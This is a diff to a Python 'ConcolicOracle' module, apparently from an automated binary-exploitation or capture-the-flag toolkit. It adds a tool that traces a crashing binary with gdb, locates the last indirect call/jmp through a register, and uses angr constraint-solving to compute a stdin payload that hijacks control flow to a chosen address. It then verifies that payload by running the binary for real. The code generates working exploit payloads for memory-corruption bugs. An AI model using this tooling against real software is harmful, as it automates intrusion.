@@ -71,7 +71,7 @@ except Exception:
     _HAVE_ANGR = False
 
 try:
-    from capstone import Cs, CS_ARCH_X86, CS_MODE_64  # type: ignore
+    from capstone import Cs, CS_ARCH_X86, CS_MODE_64, CS_OP_REG  # type: ignore
     _HAVE_CAPSTONE = True
 except Exception:
     _HAVE_CAPSTONE = False
@@ -201,7 +201,9 @@ class ConcolicOracle(Oracle):
                 "por constraint-solving el payload exacto que hace que la direccion de retorno "
                 "sea target_addr. Verifica el resultado con una ejecucion real SEPARADA (un "
                 "breakpoint en target_addr, no una inferencia). Alcance: solo el caso de "
-                "overflow lineal -> direccion de retorno (no hijacks de llamada/salto indirecto).",
+                "overflow lineal -> direccion de retorno (para un hijack de llamada/salto "
+                "indirecto POR REGISTRO -- call reg/jmp reg, no via ret -- usa "
+                "concolic_solve_indirect_control).",
                 [ToolParam("stdin_text", "stdin REAL que crashea el binario con RIP controlado (seed)"),
                  ToolParam("target_addr", "direccion objetivo a la que debe saltar (hex o int), p.ej. "
                            "win(). Dala como la direccion ESTATICA del binario (la que reporta nm/"
@@ -211,6 +213,27 @@ class ConcolicOracle(Oracle):
                  ToolParam("budget_s", "limite de tiempo en segundos (por defecto 60)",
                            required=False, default=60)],
                 lambda stdin_text, target_addr, budget_s=60: self._solve_rip(stdin_text, target_addr, budget_s),
+                self.name,
+            ),
+            Tool(
+                "concolic_solve_indirect_control",
+                "Igual que concolic_solve_rip_control pero para un hijack de llamada/salto "
+                "INDIRECTO POR REGISTRO (call reg / jmp reg -- p.ej. un puntero a funcion local "
+                "sobreescrito por un overflow y luego LLAMADO, no RETORNADO) en vez de la "
+                "direccion de retorno de un ret. Busca la ULTIMA call/jmp por registro en el "
+                "trace real, trunca el replay de angr justo ahi, y resuelve por "
+                "constraint-solving el valor exacto del registro que la controla para que salte "
+                "a target_addr. Verifica con una ejecucion real SEPARADA (breakpoint en "
+                "target_addr). Alcance: solo registro -- call/jmp VIA MEMORIA ([reg], [rip+off]) "
+                "no esta cubierto por este incremento.",
+                [ToolParam("stdin_text", "stdin REAL que crashea el binario con la call/jmp indirecta "
+                           "controlada (seed)"),
+                 ToolParam("target_addr", "direccion objetivo a la que debe saltar (hex o int), "
+                           "estatica (ver concolic_solve_rip_control)"),
+                 ToolParam("budget_s", "limite de tiempo en segundos (por defecto 60)",
+                           required=False, default=60)],
+                lambda stdin_text, target_addr, budget_s=60: self._solve_indirect(
+                    stdin_text, target_addr, budget_s),
                 self.name,
             ),
         ]
@@ -421,4 +444,133 @@ class ConcolicOracle(Oracle):
             meta["target_addr_runtime"] = hex(ta)
         return ToolResult(
             True, "concolic: gdb trace real -> angr Tracer -> constraint-solving -> verificacion real",
+            data_out, meta=meta)
+
+    def _find_last_indirect_reg_branch(self, trace, runtime_base):
+        """Escanea el trace REAL (por instruccion, no el block_trace ya colapsado -- el salto
+        indirecto puede no caer en un limite de bloque de angr) y devuelve (idx, addr, reg_name)
+        de la ULTIMA call/jmp POR REGISTRO (`call rax`/`jmp rdx`...) que aparece en la ejecucion
+        real -- o (None, None, None) si no hay ninguna. Alcance de este incremento: solo el
+        operando-registro; `call [mem]`/`jmp [mem]` (via memoria) queda fuera (ver docstring del
+        modulo)."""
+        with open(self.binary, "rb") as f:
+            elf = ELFFile(f)
+            is_pie = elf.header["e_type"] == "ET_DYN"
+            text = elf.get_section_by_name(".text")
+            data = text.data()
+            base = text["sh_addr"]
+        bias = runtime_base if (is_pie and runtime_base is not None) else 0
+        md = Cs(CS_ARCH_X86, CS_MODE_64)
+        md.detail = True
+        found = (None, None, None)
+        for idx, addr in enumerate(trace):
+            off = addr - bias - base
+            if off < 0 or off >= len(data):
+                continue
+            for insn in md.disasm(data[off:off + 16], addr):
+                if (insn.mnemonic in ("call", "jmp") and len(insn.operands) == 1
+                        and insn.operands[0].type == CS_OP_REG):
+                    reg_name = insn.reg_name(insn.operands[0].reg)
+                    found = (idx, addr, reg_name)
+                break
+        return found
+
+    def _solve_indirect(self, stdin_text, target_addr, budget_s=60) -> ToolResult:
+        try:
+            budget_s = float(budget_s)
+        except (TypeError, ValueError):
+            budget_s = 60.0
+        try:
+            static_ta = int(str(target_addr), 0) if not isinstance(target_addr, int) else target_addr
+        except ValueError:
+            return ToolResult(False, "concolic_solve_indirect_control", "",
+                              error="target_addr debe ser una direccion (hex o int)")
+
+        seed = (stdin_text.encode("utf-8", "backslashreplace")
+                if isinstance(stdin_text, str) else bytes(stdin_text))
+
+        trace, runtime_base, err = self._capture_trace(seed, budget_s / 2.0)
+        if trace is None:
+            return ToolResult(True, "concolic: captura de trace via gdb", "",
+                              error=None,
+                              meta={"verified": False, "note": f"no aplicable: {err}"})
+
+        idx, branch_addr, reg_name = self._find_last_indirect_reg_branch(trace, runtime_base)
+        if branch_addr is None:
+            return ToolResult(True, "concolic: busqueda de llamada/salto indirecto en el trace real", "",
+                              meta={"verified": False,
+                                   "note": "no se encontro ninguna call/jmp POR REGISTRO en el "
+                                           "trace real (este tool no cubre call/jmp via memoria)"})
+        try:
+            block_trace = self._block_trace(trace[:idx + 1], runtime_base)
+        except Exception as e:
+            return ToolResult(False, "concolic: reduccion de trace a bloques", "",
+                              error=f"fallo reduciendo el trace a bloques: {e}")
+
+        try:
+            with open(self.binary, "rb") as f:
+                is_pie = ELFFile(f).header["e_type"] == "ET_DYN"
+            main_opts = {"base_addr": runtime_base} if (is_pie and runtime_base is not None) else {}
+            ta = static_ta + runtime_base if (is_pie and runtime_base is not None) else static_ta
+            proj = angr.Project(self.binary, auto_load_libs=False, main_opts=main_opts)
+            sym_bytes = [claripy.BVS("stdin_b%d" % i, 8) for i in range(len(seed))]
+            sym_stdin = claripy.Concat(*sym_bytes) if len(sym_bytes) > 1 else sym_bytes[0]
+            state = proj.factory.entry_state(
+                stdin=angr.SimFileStream(name="stdin", content=sym_stdin, has_end=True))
+            simgr = proj.factory.simgr(state)
+            simgr.use_technique(Tracer(trace=block_trace))
+            simgr.run()
+        except Exception as e:
+            return ToolResult(True, "concolic: replay del trace real en angr", "",
+                              meta={"verified": False,
+                                   "note": f"angr no pudo reproducir el camino real: {e}"})
+
+        traced = simgr.stashes.get("traced") or []
+        if not traced:
+            return ToolResult(True, "concolic: replay del trace real en angr", "",
+                              meta={"verified": False,
+                                   "note": "angr no llego al final del trace real (desync)"})
+        st = traced[0]
+        regv = getattr(st.regs, reg_name)
+        if not regv.symbolic:
+            return ToolResult(True, "concolic: dependencia simbolica del registro", "",
+                              meta={"verified": False,
+                                   "note": f"el registro {reg_name} en 0x{branch_addr:x} (la "
+                                           f"call/jmp real) NO depende del stdin segun este "
+                                           f"modelo",
+                                   "branch_addr": hex(branch_addr), "branch_reg": reg_name})
+
+        offsets = sorted({int(mo.group(1)) for mo in
+                          (re.match(r"stdin_b(\d+)_", v) for v in regv.variables) if mo})
+        st.solver.add(regv == ta)
+        if not st.solver.satisfiable():
+            return ToolResult(True, "concolic: constraint-solving sobre el trace real", "",
+                              meta={"verified": False,
+                                   "note": f"0x{static_ta:x} (runtime 0x{ta:x}) no es alcanzable "
+                                           f"desde este punto segun el modelo simbolico (unsat)",
+                                   "controlled_offsets": offsets})
+        try:
+            solved = st.solver.eval(sym_stdin, cast_to=bytes)
+        except Exception as e:
+            return ToolResult(False, "concolic: eval del stdin resuelto", "",
+                              error=f"sat pero no se pudo evaluar un ejemplo concreto: {e}")
+
+        verified = self._verify_real(solved, ta, budget_s / 2.0)
+        offs_txt = f"{min(offsets)}..{max(offsets)}" if offsets else "?"
+        if verified:
+            data_out = (f"CONFIRMADO: el payload resuelto por constraint-solving redirige la "
+                       f"call/jmp indirecta en 0x{branch_addr:x} (registro {reg_name}) a "
+                       f"0x{static_ta:x} de verdad (breakpoint disparado en una ejecucion "
+                       f"separada). Offset(s) del stdin que controlan {reg_name}: {offs_txt}.")
+        else:
+            data_out = (f"El payload se resolvio (sat) pero la verificacion REAL (breakpoint en "
+                       f"0x{static_ta:x}) no disparo -- no se confirma. Offset(s) candidatos: {offs_txt}.")
+        meta = {"verified": verified, "target_addr": hex(static_ta), "controlled_offsets": offsets,
+               "payload_hex": solved.hex(), "branch_addr": hex(branch_addr), "branch_reg": reg_name}
+        if is_pie and runtime_base is not None:
+            meta["pie"] = True
+            meta["target_addr_runtime"] = hex(ta)
+        return ToolResult(
+            True, "concolic: gdb trace real -> angr Tracer (truncado en la call/jmp indirecta) "
+                 "-> constraint-solving -> verificacion real",
             data_out, meta=meta)
